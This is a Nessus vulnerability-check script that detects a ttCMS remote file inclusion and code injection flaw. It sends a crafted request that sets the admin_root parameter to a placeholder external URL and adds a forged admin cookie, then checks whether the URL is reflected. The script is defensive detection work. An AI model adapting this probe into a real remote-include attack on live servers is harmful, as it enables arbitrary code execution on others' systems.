#
# This script was written by Renaud Deraison
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(11636);
 script_bugtraq_id(7542, 7543, 7625);
 
 script_version ("$Revision: 1.7 $");
 name["english"] = "ttCMS code injection";
 
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
The remote server is running a version of ttCMS which is vulnerable
to code injection, as well as to a SQL injection vulnerability.

An attacker may use these flaws to execute arbitrary PHP code on this
host or to take the control of the remote database.

Solution : upgrade to the latest version of ttCMS.
Risk factor : High";





 script_description(english:desc["english"]);
 
 summary["english"] = "Attempts to include a file";
 
 script_summary(english:summary["english"],
francais:summary["francais"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2003 Renaud Deraison");
 family["english"] = "CGI abuses";
 
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
			 

function check(port, dir)
{
 if(isnull(dir))dir = "";
 req = http_get(item:dir+"/admin/templates/header.php?admin_root=http://xxxxxxxx.", port:port);
 idx = stridx(req, string("\r\n\r\n"));
 if(idx <= 0) return(0);
 req = insstr(req, string("\r\nCookie: ttcms_user_admin=1\r\n\r\n"), idx);
									 

 r = http_keepalive_send_recv(port:port, data:req);
 if( r == NULL )return(0);
 
 if("http://xxxxxxxx./templates/header.inc.php" >< r)
 {
  security_hole(port);
  exit(0);
 }
}

    
    
port = get_http_port(default:80);


if(get_port_state(port))
{
 if ( ! can_host_php(port:port) ) exit(0);

 foreach dir (cgi_dirs())
 {
  check(port:port, dir:dir);
 }
}
